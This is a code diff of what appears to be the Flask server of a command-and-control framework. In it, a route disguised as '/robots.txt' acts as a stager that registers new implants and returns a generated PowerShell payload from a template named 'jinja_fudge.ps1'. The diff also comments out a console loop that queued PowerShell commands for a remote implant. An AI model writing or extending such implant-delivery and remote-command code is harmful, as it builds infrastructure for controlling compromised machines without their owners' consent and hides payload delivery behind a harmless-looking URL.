@@ -25,6 +25,8 @@ def add_header( r):
     #r.headers["X-Command"] = a
     return r
 
+
+# -- This should be extracted and added into a new stager specific listener
 @app.route("/robots.txt",methods=['GET'])
 def Stager():
     # This needs to return the implant!
@@ -34,6 +36,9 @@ def Stager():
     # -- Build checking before triggering this!
     b = db.Register_NewImplantFromStagerKey(request.values['user'])
     if b:
+        # -- Replacing the hardcoded jinja template in use.
+        output_from_parsed_template = Imp.GeneratePayload(b)
+        # -- End of replacement. Will overwrite 'output_from_parsed_template' for the meantime.
         from jinja2 import Environment, FileSystemLoader
         env = Environment(loader=FileSystemLoader('implant_core'))
         template = env.get_template('jinja_fudge.ps1')
@@ -80,9 +85,7 @@ def getNode(id):
 
 @app.route("/aaa",methods=["GET"])
 def testing():
-    print(implant.instance)
-
-
+    print(0)
 
 
 
@@ -91,10 +94,11 @@ def print_time(threadName, delay):
 
 if __name__ == "__main__":
 
-    I=Implant()
+    #I=Implant.ImplantSingleton
     app.run(debug=True, host='0.0.0.0', port=5000, threaded=True)
     print ("App running")
-
+    from time import sleep
     while True:
-        a = raw_input("Enter PS command: ")
-        I.AddCommand(a)
+        sleep(1)
+        #a = raw_input("Enter PS command: ")
+        #I.AddCommand(a)
